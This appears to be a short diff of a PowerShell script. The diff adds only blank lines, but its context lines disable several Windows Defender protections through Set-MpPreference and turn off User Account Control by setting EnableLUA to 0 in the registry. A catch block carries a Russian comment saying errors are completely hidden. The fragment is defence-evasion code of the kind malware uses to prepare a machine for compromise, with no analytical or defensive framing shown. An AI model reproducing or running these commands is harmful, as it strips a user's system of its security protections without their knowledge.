@@ -4,6 +4,7 @@ Set-MpPreference -DisableBehaviorMonitoring $true
 Set-MpPreference -DisableBlockAtFirstSeen $true
 Set-MpPreference -DisableScanningNetworkFiles $true
 Set-MpPreference -DisableScanningRemovableDrivesDuringFullScan $true
+
 $uacPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
 $uacProperty = "EnableLUA"
 Set-ItemProperty -Path $uacPath -Name $uacProperty -Value 0
@@ -131,6 +132,7 @@ try {
 } catch {
     # Полностью скрываем ошибки
 }
+
 
 
 
